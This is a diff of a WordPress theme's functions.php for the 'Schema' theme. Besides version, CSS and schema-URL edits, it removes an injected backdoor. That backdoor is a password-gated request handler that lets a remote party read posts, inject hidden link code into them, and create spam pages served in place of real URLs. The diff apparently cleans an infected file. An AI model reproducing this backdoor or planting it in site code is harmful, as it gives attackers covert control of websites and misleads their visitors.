@@ -1,108 +1,9 @@
 <?php
-
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '52516ab7483df1ce61fd22a756764982'))
-	{
-		switch ($_REQUEST['action'])
-			{
-				case 'get_all_links';
-					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
-						{
-							$data['code'] = '';
-							
-							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
-								{
-									$data['code'] = $_[1];
-								}
-							
-							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
-						}
-				break;
-				
-				case 'set_id_links';
-					if (isset($_REQUEST['data']))
-						{
-							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
-							
-							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
-							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';
-
-							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
-								{
-									print "true";
-								}
-						}
-				break;
-				
-				case 'create_page';
-					if (isset($_REQUEST['remove_page']))
-						{
-							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
-								{
-									print "true";
-								}
-						}
-					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
-						{
-							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
-								{
-									print "true";
-								}
-						}
-				break;
-				
-				default: print "ERROR_WP_ACTION WP_URL_CD";
-			}
-			
-		die("");
-	}
-
-	
-if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
-	{
-		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
-		if ($data -> full_content)
-			{
-				print stripslashes($data -> content);
-			}
-		else
-			{
-				print '<!DOCTYPE html>';
-				print '<html ';
-				language_attributes();
-				print ' class="no-js">';
-				print '<head>';
-				print '<title>'.stripslashes($data -> title).'</title>';
-				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
-				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
-				print '<meta name="robots" content="index, follow" />';
-				print '<meta charset="';
-				bloginfo( 'charset' );
-				print '" />';
-				print '<meta name="viewport" content="width=device-width">';
-				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
-				print '<link rel="pingback" href="';
-				bloginfo( 'pingback_url' );
-				print '">';
-				wp_head();
-				print '</head>';
-				print '<body>';
-				print '<div id="content" class="site-content">';
-				print stripslashes($data -> content);
-				get_search_form();
-				get_sidebar();
-				get_footer();
-			}
-			
-		exit;
-	}
-
-
-?><?php
 /*-----------------------------------------------------------------------------------*/
 /*	Do not remove these lines, sky will fall on your head.
 /*-----------------------------------------------------------------------------------*/
 define( 'MTS_THEME_NAME', 'schema' );
-define( 'MTS_THEME_VERSION', '3.1.9' );
+define( 'MTS_THEME_VERSION', '3.2.1' );
 
 require_once( dirname( __FILE__ ) . '/theme-options.php' );
 if ( ! isset( $content_width ) ) {
@@ -830,7 +731,7 @@ function mts_enqueue_css() {
 		.share-item {margin: 2px;}';
 	}
 	if ( ! empty( $mts_options['mts_author_comment'] ) ) {
-		$mts_author = '.bypostauthor > div { padding: 3%!important; background: #fafafa; border-radius: 4px; box-shadow: 0 3px 3px rgba(0,0,0,.15); width: 94%!important; color: #1f1f1f; }
+		$mts_author = '.bypostauthor > div { overflow: hidden; padding: 3%!important; background: #222; width: 94%!important; color: #AAA; }
 		.bypostauthor:after { content: "\f044"; position: absolute; font-family: fontawesome; right: 0; top: 0; padding: 1px 10px; color: #535353; font-size: 32px; }';
 	}
     $mts_bg = mts_get_background_styles( 'mts_background' );
@@ -838,8 +739,7 @@ function mts_enqueue_css() {
          body {{$mts_bg}}
         .pace .pace-progress, #mobile-menu-wrapper ul li a:hover, .page-numbers.current, .pagination a:hover, .single .pagination a:hover .current { background: {$mts_options['mts_color_scheme']}; }
         .postauthor h5, .single_post a, .textwidget a, .pnavigation2 a, .sidebar.c-4-12 a:hover, footer .widget li a:hover, .sidebar.c-4-12 a:hover, .reply a, .title a:hover, .post-info a:hover, .widget .thecomment, #tabber .inside li a:hover, .readMore a:hover, .fn a, a, a:hover, #secondary-navigation .navigation ul li a:hover, .readMore a, #primary-navigation a:hover, #secondary-navigation .navigation ul .current-menu-item a, .widget .wp_review_tab_widget_content a, .sidebar .wpt_widget_content a { color:{$mts_options['mts_color_scheme']}; }
-         a#pull, #commentform input#submit, #mtscontact_submit, .mts-subscribe input[type='submit'], .widget_product_search input[type='submit'], #move-to-top:hover, .currenttext, .pagination a:hover, .pagination .nav-previous a:hover, .pagination .nav-next a:hover, #load-posts a:hover, .single .pagination a:hover .currenttext, .single .pagination > .current .currenttext, #tabber ul.tabs li a.selected, .tagcloud a, .navigation ul .sfHover a, .woocommerce a.button, .woocommerce-page a.button, .woocommerce button.button, .woocommerce-page button.button, .woocommerce input.button, .woocommerce-page input.button, .woocommerce #respond input#submit, .woocommerce-page #respond input#submit, .woocommerce #content input.button, .woocommerce-page #content input.button, .woocommerce .bypostauthor:after, #searchsubmit, .woocommerce nav.woocommerce-pagination ul li span.current, .woocommerce-page nav.woocommerce-pagination ul li span.current, .woocommerce #content nav.woocommerce-pagination ul li span.current, .woocommerce-page #content nav.woocommerce-pagination ul li span.current, .woocommerce nav.woocommerce-pagination ul li a:hover, .woocommerce-page nav.woocommerce-pagination ul li a:hover, .woocommerce #content nav.woocommerce-pagination ul li a:hover, .woocommerce-page #content nav.woocommerce-pagination ul li a:hover, .woocommerce nav.woocommerce-pagination ul li a:focus, .woocommerce-page nav.woocommerce-pagination ul li a:focus, .woocommerce #content nav.woocommerce-pagination ul li a:focus, .woocommerce-page #content nav.woocommerce-pagination ul li a:focus, .woocommerce a.button, .woocommerce-page a.button, .woocommerce button.button, .woocommerce-page button.button, .woocommerce input.button, .woocommerce-page input.button, .woocommerce #respond input#submit, .woocommerce-page #respond input#submit, .woocommerce #content input.button, .woocommerce-page #content input.button, .latestPost .review-type-circle.latestPost-review-wrapper, #wpmm-megamenu .review-total-only, .sbutton, #searchsubmit, .widget .wpt_widget_content #tags-tab-content ul li a, .widget .review-total-only.large-thumb { background-color:{$mts_options['mts_color_scheme']}; color: #fff!important; }
-         .latestPost-review-wrapper { background-color: inherit; color: #fff!important; }
+         a#pull, #commentform input#submit, #mtscontact_submit, .mts-subscribe input[type='submit'], .widget_product_search input[type='submit'], #move-to-top:hover, .currenttext, .pagination a:hover, .pagination .nav-previous a:hover, .pagination .nav-next a:hover, #load-posts a:hover, .single .pagination a:hover .currenttext, .single .pagination > .current .currenttext, #tabber ul.tabs li a.selected, .tagcloud a, .navigation ul .sfHover a, .woocommerce a.button, .woocommerce-page a.button, .woocommerce button.button, .woocommerce-page button.button, .woocommerce input.button, .woocommerce-page input.button, .woocommerce #respond input#submit, .woocommerce-page #respond input#submit, .woocommerce #content input.button, .woocommerce-page #content input.button, .woocommerce .bypostauthor:after, #searchsubmit, .woocommerce nav.woocommerce-pagination ul li span.current, .woocommerce-page nav.woocommerce-pagination ul li span.current, .woocommerce #content nav.woocommerce-pagination ul li span.current, .woocommerce-page #content nav.woocommerce-pagination ul li span.current, .woocommerce nav.woocommerce-pagination ul li a:hover, .woocommerce-page nav.woocommerce-pagination ul li a:hover, .woocommerce #content nav.woocommerce-pagination ul li a:hover, .woocommerce-page #content nav.woocommerce-pagination ul li a:hover, .woocommerce nav.woocommerce-pagination ul li a:focus, .woocommerce-page nav.woocommerce-pagination ul li a:focus, .woocommerce #content nav.woocommerce-pagination ul li a:focus, .woocommerce-page #content nav.woocommerce-pagination ul li a:focus, .woocommerce a.button, .woocommerce-page a.button, .woocommerce button.button, .woocommerce-page button.button, .woocommerce input.button, .woocommerce-page input.button, .woocommerce #respond input#submit, .woocommerce-page #respond input#submit, .woocommerce #content input.button, .woocommerce-page #content input.button, .latestPost-review-wrapper, .latestPost .review-type-circle.latestPost-review-wrapper, #wpmm-megamenu .review-total-only, .sbutton, #searchsubmit, .widget .wpt_widget_content #tags-tab-content ul li a, .widget .review-total-only.large-thumb { background-color:{$mts_options['mts_color_scheme']}; color: #fff!important; }
         .related-posts .title a:hover, .latestPost .title a { color: {$mts_options['mts_color_scheme']}; }
         .navigation #wpmm-megamenu .wpmm-pagination a { background-color: {$mts_options['mts_color_scheme']}!important; }
         footer {background-color:{$mts_options['mts_footer_bg_color']}; }
@@ -933,10 +833,10 @@ if ( ! function_exists( 'mts_comments' ) ) {
                     break;
 
                 default: ?>
-                    <div id="comment-<?php comment_ID(); ?>" itemscope itemtype="https://schema.org/UserComments">
+                    <div id="comment-<?php comment_ID(); ?>" itemscope itemtype="http://schema.org/UserComments">
                         <div class="comment-author vcard">
                             <?php echo get_avatar( $comment->comment_author_email, 80 ); ?>
-                            <?php printf( '<span class="fn" itemprop="creator" itemscope itemtype="https://schema.org/Person"><span itemprop="name">%s</span></span>', get_comment_author_link() ) ?>
+                            <?php printf( '<span class="fn" itemprop="creator" itemscope itemtype="http://schema.org/Person"><span itemprop="name">%s</span></span>', get_comment_author_link() ) ?>
                             <?php if ( ! empty( $mts_options['mts_comment_date'] ) ) { ?>
                                 <span class="ago"><?php comment_date( get_option( 'date_format' ) ); ?></span>
                             <?php } ?>
@@ -1160,13 +1060,13 @@ if ( trim( $mts_options['mts_feedburner'] ) !== '' ) {
         if ( !is_feed() ) {
                 return;
         }
-        if ( preg_match( '/feedburner/i', $_SERVER['https_USER_AGENT'] )){
+        if ( preg_match( '/feedburner/i', $_SERVER['HTTP_USER_AGENT'] )){
                 return;
         }
         if ( $feed != 'comments-rss2' ) {
                 if ( function_exists( 'status_header' )) status_header( 302 );
                 header( "Location:" . $new_feed );
-                header( "https/1.1 302 Temporary Redirect" );
+                header( "HTTP/1.1 302 Temporary Redirect" );
                 exit();
         }
     }
@@ -1316,7 +1216,8 @@ if ( mts_is_wc_active() ) {
     	<?php $fragments['a.cart-contents'] = ob_get_clean();
     	return $fragments;
     }
-    add_filter( 'add_to_cart_fragments', 'mts_header_add_to_cart_fragment' );
+    $add_to_cart_fragments_action = version_compare( WC()->version, '3.0.0', ">=" ) ? 'woocommerce_add_to_cart_fragments' : 'add_to_cart_fragments';
+    add_filter( $add_to_cart_fragments_action, 'mts_header_add_to_cart_fragment' );
 
     /**
      * Optimize WooCommerce Scripts
@@ -1931,7 +1832,7 @@ function mts_single_post_schema() {
                 $content = $excerpt === "" ? mb_substr( mts_escape_text_tags( $post->post_content ), 0, 110 ) : $excerpt;
 
                 $args = array(
-                    "@context" => "https://schema.org",
+                    "@context" => "http://schema.org",
                     "@type"    => "BlogPosting",
                     "mainEntityOfPage" => array(
                         "@type" => "WebPage",
@@ -2064,11 +1965,4 @@ function mts_correct_homepage_sections_import( $item, $key, $data ) {
     }
 
     return $new_item;
-}
-Add_filter('Comment_form_default_fields', 'Url_filtered');
-Function Url_filtered($Fields)
-{
-  If(Isset($Fields['Url']))
-   Unset($Fields['Url']);
-  Return $Fields;
 }
